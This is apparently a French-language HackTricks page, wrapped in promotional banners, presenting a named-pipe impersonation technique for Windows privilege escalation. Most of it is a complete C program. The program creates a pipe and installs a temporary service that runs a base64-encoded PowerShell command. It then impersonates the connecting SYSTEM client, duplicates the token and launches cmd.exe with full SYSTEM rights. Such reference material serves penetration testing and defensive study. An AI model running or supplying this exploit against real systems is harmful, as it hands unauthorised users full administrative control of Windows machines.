<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [dépôt hacktricks](https://github.com/carlospolop/hacktricks) et au [dépôt hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


**Code flow:**

1. Créer un nouveau pipe
2. Créer et démarrer un service qui se connectera au pipe créé et écrira quelque chose. Le code du service exécutera ce code PS encodé : `$pipe = new-object System.IO.Pipes.NamedPipeClientStream("piper"); $pipe.Connect(); $sw = new-object System.IO.StreamWriter($pipe); $sw.WriteLine("Go"); $sw.Dispose();`
3. Le service reçoit les données du client dans le pipe, appelle ImpersonateNamedPipeClient et attend que le service se termine
4. Enfin, utilise le jeton obtenu à partir du service pour lancer un nouveau _cmd.exe_
```c
#include <windows.h>
#include <time.h>

#pragma comment (lib, "advapi32")
#pragma comment (lib, "kernel32")

#define PIPESRV "PiperSrv"
#define MESSAGE_SIZE 512

int ServiceGo(void) {

	SC_HANDLE scManager;
	SC_HANDLE scService;

	scManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);

	if (scManager == NULL) {
		return FALSE;
	}

	// create Piper service
	scService = CreateServiceA(scManager, PIPESRV, PIPESRV, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
		SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
		"C:\\Windows\\\System32\\cmd.exe /rpowershell.exe -EncodedCommand JABwAGkAcABlACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFAAaQBwAGUAcwAuAE4AYQBtAGUAZABQAGkAcABlAEMAbABpAGUAbgB0AFMAdAByAGUAYQBtACgAIgBwAGkAcABlAHIAIgApADsAIAAkAHAAaQBwAGUALgBDAG8AbgBuAGUAYwB0ACgAKQA7ACAAJABzAHcAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAHAAaQBwAGUAKQA7ACAAJABzAHcALgBXAHIAaQB0AGUATABpAG4AZQAoACIARwBvACIAKQA7ACAAJABzAHcALgBEAGkAcwBwAG8AcwBlACgAKQA7AA==",
		NULL, NULL, NULL, NULL, NULL);

	if (scService == NULL) {
		//printf("[!] CreateServiceA() failed: [%d]\n", GetLastError());
		return FALSE;
	}

	// launch it
	StartService(scService, 0, NULL);

	// wait a bit and then cleanup
	Sleep(10000);
	DeleteService(scService);

	CloseServiceHandle(scService);
	CloseServiceHandle(scManager);
}

int main() {

	LPCSTR sPipeName = "\\\\.\\pipe\\piper";
	HANDLE hSrvPipe;
	HANDLE th;
	BOOL bPipeConn;
	char pPipeBuf[MESSAGE_SIZE];
	DWORD dBRead = 0;

	HANDLE hImpToken;
	HANDLE hNewToken;
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	// open pipe
	hSrvPipe = CreateNamedPipeA(sPipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT,
		PIPE_UNLIMITED_INSTANCES, 1024, 1024, 0, NULL);

	// create and run service
	th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ServiceGo, NULL, 0, 0);

	// wait for the connection from the service
	bPipeConn = ConnectNamedPipe(hSrvPipe, NULL);
	if (bPipeConn) {
		ReadFile(hSrvPipe, &pPipeBuf, MESSAGE_SIZE, &dBRead, NULL);

		// impersonate the service (SYSTEM)
		if (ImpersonateNamedPipeClient(hSrvPipe) == 0) {
			return -1;
		}

		// wait for the service to cleanup
		WaitForSingleObject(th, INFINITE);

		// get a handle to impersonated token
		if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hImpToken)) {
			return -2;
		}

		// create new primary token for new process
		if (!DuplicateTokenEx(hImpToken, TOKEN_ALL_ACCESS, NULL, SecurityDelegation,
			TokenPrimary, &hNewToken)) {
			return -4;
		}

		//Sleep(20000);
		// spawn cmd.exe as full SYSTEM user
		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));
		if (!CreateProcessWithTokenW(hNewToken, LOGON_NETCREDENTIALS_ONLY, L"cmd.exe", NULL,
			NULL, NULL, NULL, (LPSTARTUPINFOW)&si, &pi)) {
			return -5;
		}

		// revert back to original security context
		RevertToSelf();

	}

	return 0;
}
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [dépôt hacktricks](https://github.com/carlospolop/hacktricks) et au [dépôt hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
